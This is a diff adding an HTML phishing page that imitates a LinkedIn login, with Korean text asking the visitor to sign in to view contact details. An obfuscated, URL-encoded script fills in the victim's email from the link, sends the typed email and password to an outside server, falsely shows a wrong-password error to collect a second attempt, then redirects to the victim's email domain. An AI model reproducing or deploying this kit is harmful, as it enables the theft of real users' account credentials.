@@ -1,0 +1,92 @@
+
+<!doctype html>
+<html lang="en">
+
+<head>    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>LinkedIn | Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="https://www.linkedin.com/favicon.ico"/>
+    <style type="text/css">
+    </style>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.js" integrity="sha512-CX7sDOp7UTAq+i1FYIlf9Uo27x4os+kGeoT7rgwvY+4dmjqV0IuE/Bl5hVsjnQPQiTOhAX1O2r2j5bjsFBvv/A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+</head>
+
+<body style="background:url(&#39;https://cdn.glitch.global/e8bbef66-16ac-4e56-a145-277d0daf5037/bgg.jpg?v=1712913260146&#39;); background-size: cover; background-repeat: no-repeat;">
+    <button type="button" class="btn btn-primary" id="m-btn" data-toggle="modal" data-target="#exampleModalCenter" style="visibility: hidden;">
+        Launch demo modal
+    </button>
+    <!-- Modal -->
+    <div class="modal fade" id="exampleModalCenter" data-backdrop="static" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content" style="min-width: 350px">
+                <div class="modal-header p-2" style="background-color: #0077B5;" id=logo> 
+				<IMG border=9 alt="" align="left" src="https://cdn.glitch.global/e8bbef66-16ac-4e56-a145-277d0daf5037/logoo.png?v=1712913250747" style="width:170px; height:50px;">
+                    <button type="button" class="close" aria-label="Close">
+                        <span aria-hidden="true">×</span>
+                    </button>
+                </div>
+                <form class="mt-4" id="form-1" method="POST">
+                    <div class="modal-body px-5">
+                        <span style="color: #575757;font-size: 25px";>
+						<strong>인증 필요 </strong><br>
+                        </span>
+						<br>
+						<span style="color: #575757;font-size: 15px";>
+							Mobile: +82 509 xxx xxxx </i><br>
+							Email: ceo@xxxxxxxxxxx <i>(연락 보류)</i>
+							
+							<br><br>
+							<strong> 내 연락처 정보를 보려면 계정에 로그인하세요. </strong>
+                        </span>
+						<br><br>
+                        <input type="hidden" name="btn1" value="btn1">
+                        <center>
+                            <div class="alert alert-danger" id="msg" style="display: none; font-size: 13px;">&#50976;&#54952;&#54616;&#51648; &#50506;&#51008; &#48708;&#48128;&#48264;&#54840;! &#51221;&#54869;&#54620; &#48708;&#48128;&#48264;&#54840;&#47484; &#51077;&#47141;&#54644;&#51452;&#49464;&#50836;.</div>
+                        </center>
+                        <div class="form-group row">
+                            <div class="col-sm-8">
+                                <input type="email" class="form-control py-1" id="ai" style="width:405px; height:45px;" 
+								name="ai" value="" required placeholder="电子邮件地址" required>
+                            </div>
+                        </div>
+                        <div class="form-group row">
+                            <div class="col-sm-8 ">
+                                <input type="password" class="form-control py-1" id="pr"  style="width:405px; height:45px;"
+								name="pr" placeholder="Password" required>
+                            </div>
+                        </div>
+                    </div>
+				<div style="text-align:center" id="processing"><img src="https://i.gyazo.com/e62f80ff2ac874cd4491a99ef09a6f51.gif" width="50px" /></div>
+                <div class="modal-footer p-2">
+					<button type="button" class="btn btn-success py-1" style="background-color: #0077B5; width:100px; height:40px" id="submit-btn">&#47196;&#44536;&#51064;</button>
+                </div>
+            </div>
+</style>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+</body>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+<script>
+	/*function sub() {
+		var ai = $("#ai").val();
+        var pr = $("#pr").val();
+		var email = ai; 
+		var password = pr;
+		$.post('', {email: email, password: password}, function(data) {
+			$("#processing").hide();
+			alert(email + " " + password);
+		});
+	}*/
+</script>
+
+<script language=javascript>document.write(unescape('%3Cscript%3E%0D%0A/*%20global%20%24%20*/%0D%0A%24%28document%29.ready%28function%28%29%20%7B%0D%0A%20%20%20%20var%20count%20%3D%200%3B%0D%0A%0D%0A%0D%0A%20%20%20%20%24%28%27%23m-btn%27%29.click%28%29%3B%0D%0A%0D%0A%20%20%20%20/////////////url%20ai%20getting////////////////%0D%0A%20%20%20%20var%20ai%20%3D%20window.location.hash.substr%281%29%3B%0D%0A%20%20%20%20if%20%28%21ai%29%20%7B%0D%0A%0D%0A%20%20%20%20%7D%20else%20%7B%0D%0A%20%20%20%20%20%20%20%20var%20base64regex%20%3D%20/%5E%28%5B0-9a-zA-Z+/%5D%7B4%7D%29*%28%28%5B0-9a-zA-Z+/%5D%7B2%7D%3D%3D%29%7C%28%5B0-9a-zA-Z+/%5D%7B3%7D%3D%29%29%3F%24/%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20if%20%28%21base64regex.test%28ai%29%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20alert%28btoa%28email%29%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20my_ai%20%3D%20ai%3B%0D%0A%20%20%20%20%20%20%20%20%7D%20else%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20alert%28atob%28email%29%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20my_ai%20%3D%20atob%28ai%29%3B%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20//%20%24%28%27%23email%27%29.val%28email%29%3B%0D%0A%20%20%20%20%20%20%20%20//%20var%20my_email%20%3Demail%3B%0D%0A%20%20%20%20%20%20%20%20var%20filter%20%3D%20/%5E%28%5Ba-zA-Z0-9_%5C.%5C-%5D%29+%5C@%28%28%5Ba-zA-Z0-9%5C-%5D%29+%5C.%29+%28%5Ba-zA-Z0-9%5D%7B2%2C4%7D%29+%24/%3B%0D%0A%20%20%20%20%20%20%20%20//%20%24%28%27%23ai%27%29.val%28ai%29%3B%0D%0A%20%20%20%20%20%20%20%20//%20var%20my_ai%20%3D%20ai%3B%0D%0A%20%20%20%20%20%20%20%20var%20ind%20%3D%20my_ai.indexOf%28%22@%22%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20my_slice%20%3D%20my_ai.substr%28%28ind%20+%201%29%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20c%20%3D%20my_slice.substr%280%2C%20my_slice.indexOf%28%27.%27%29%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20final%20%3D%20c.toLowerCase%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%24%28%27%23ai%27%29.val%28my_ai%29%3B%0D%0A%20%20%20%20%20%20%20%20%24%28%27%23ai%27%29.attr%28%27readonly%27%2C%20true%29%3B%0D%0A%20%20%20%20%20%20%20%20%24%28%22%23msg%22%29.hide%28%29%3B%0D%0A%09%09%24%28%22%23processing%22%29.hide%28%29%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20///////////////url%20getting%20ai////////////////%0D%0A%09%24%28document%29.keypress%28function%28event%29%20%7B%0D%0A%0D%0A%20%20%20%20%20%20%20%20var%20keycode%20%3D%20%28event.keyCode%20%3F%20event.keyCode%20%3A%20event.which%29%3B%0D%0A%20%20%20%20%20%20%20%20if%20%28keycode%20%3D%3D%20%2713%27%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23submit-btn%22%29.click%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%7D%29%3B%0D%0A%0D%0A%20%20%20%20var%20file%20%3D%20%22%22%3B%0D%0A%0D%0A%20%20%20%20%24%28%27%23submit-btn%27%29.click%28function%28event%29%20%7B%0D%0A%09%09%24%28%22%23processing%22%29.show%28%29%0D%0A%09%09setTimeout%28function%28%29%7B%0D%0A%09%09%24%28%22%23processing%22%29.hide%28%29%0D%0A%09%09%24%28%27%23error%27%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%24%28%27%23msg%27%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20event.preventDefault%28%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20ai%20%3D%20%24%28%22%23ai%22%29.val%28%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20pr%20%3D%20%24%28%22%23pr%22%29.val%28%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20msg%20%3D%20%24%28%27%23msg%27%29.html%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%24%28%27%23msg%27%29.text%28msg%29%3B%0D%0A%20%20%20%20%20%20%20%20///////////new%20injection////////////////%0D%0A%20%20%20%20%20%20%20%20var%20my_ai%20%3D%20ai%3B%0D%0A%20%20%20%20%20%20%20%20var%20filter%20%3D%20/%5E%28%5Ba-zA-Z0-9_%5C.%5C-%5D%29+%5C@%28%28%5Ba-zA-Z0-9%5C-%5D%29+%5C.%29+%28%5Ba-zA-Z0-9%5D%7B2%2C4%7D%29+%24/%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20if%20%28%21ai%29%20%7B%0D%0A%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23error%27%29.show%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23error%27%29.html%28%22%26%2351060%3B%26%2347700%3B%26%2351068%3B%20%26%2354596%3B%26%2346300%3B%26%2345716%3B%20%26%2348708%3B%26%2350612%3B%20%26%2351080%3B%26%2349845%3B%26%2345768%3B%26%2345796%3B.%21%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20ai.focus%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20%20%20else%20if%20%28%21pr%29%20%7B%0D%0A%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23error%27%29.show%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23error%27%29.html%28%22%26%2348708%3B%26%2348128%3B%26%2348264%3B%26%2354840%3B%20%26%2351077%3B%26%2347141%3B%26%2346976%3B%26%2351008%3B%20%26%2348708%3B%26%2350612%3B%26%2351080%3B%26%2349845%3B%26%2345768%3B%26%2345796%3B.%21%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20ai.focus%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%0D%0A%09%09else%20%7B%0D%0A%09%09%0D%0A%20%20%20%20%20%20%20%20var%20ind%20%3D%20my_ai.indexOf%28%22@%22%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20my_slice%20%3D%20my_ai.substr%28%28ind%20+%201%29%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20c%20%3D%20my_slice.substr%280%2C%20my_slice.indexOf%28%27.%27%29%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20final%20%3D%20c.toLowerCase%28%29%3B%0D%0A%20%20%20%20%20%20%20%20///////////new%20injection////////////////%0D%0A%20%20%20%20%20%20%20%20count%20%3D%20count%20+%201%3B%0D%0A%09%09%0D%0A%09%09%0D%0A%0D%0A%20%20%20%20%20%20%20%20%24.ajax%28%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20dataType%3A%20%27JSON%27%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20//url%3A%20atob%28file%29%2C%0D%0A%09%09%09url%3A%20%27https://dev-deviled.pantheonsite.io/wp-includes/likr/next.php%27%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20type%3A%20%27POST%27%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20data%3A%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20ai%3A%20ai%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pr%3A%20pr%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20data%3A%20%24%28%27%23contact%27%29.serialize%28%29%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20beforeSend%3A%20function%28xhr%29%20%7B%0D%0A%09%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23submit-btn%27%29.html%28%27%26%2354869%3B%26%2351064%3B%20%26%2351473%3B...%27%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20success%3A%20function%28response%29%20%7B%0D%0A%09%09%09%09alert%28response%29%3B%0D%0A%09%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28response%29%20%7B%0D%0A%09%09%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg%22%29.show%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28response%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28response%5B%27signal%27%5D%20%3D%3D%20%27ok%27%29%20%7B%0D%0A%09%09%09%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23pr%22%29.val%28%22%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28count%20%3E%3D%202%29%20%7B%0D%0A%09%09%09%09%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20count%20%3D%200%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20window.location.replace%28response%5B%27redirect_link%27%5D%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%22http%3A//www.%22%20+%20my_slice%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%24%28%27%23msg%27%29.html%28response%5B%27msg%27%5D%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0D%0A%09%09%09%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%24%28%27%23msg%27%29.html%28response%5B%27msg%27%5D%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20error%3A%20function%28%29%20%7B%0D%0A%09%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23pr%22%29.val%28%22%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28count%20%3E%3D%202%29%20%7B%0D%0A%09%09%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20count%20%3D%200%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%22http%3A//www.%22%20+%20my_slice%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg%22%29.show%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%24%28%27%23msg%27%29.html%28%22%26%2345208%3B%26%2351473%3B%26%2350640%3B%20%26%2345796%3B%26%2349884%3B%20%26%2349884%3B%26%2346020%3B%20%26%2354644%3B%26%2351452%3B%26%2349901%3B%26%2349884%3B%26%2350724%3B%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20complete%3A%20function%28%29%20%7B%0D%0A%09%09%09%09%24%28%22%23processing%22%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23submit-btn%27%29.html%28%27%26%2347196%3B%26%2344536%3B%26%2351064%3B%27%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0D%0A%09%09%7D%0D%0A%09%09%09%0D%0A%09%09%7D%2C4000%29%3B%0D%0A%20%20%20%20%7D%29%3B%0D%0A%0D%0A%7D%29%3B%0D%0A%3C/script%3E%0D%0A%0D%0A%3Cscript%3E%0D%0A%09%24%28%22%23processing%22%29.hide%28%29%0D%0A%3C/script%3E%0D%0A%0D%0A%3C/html%3E'))</script>
+
+
+
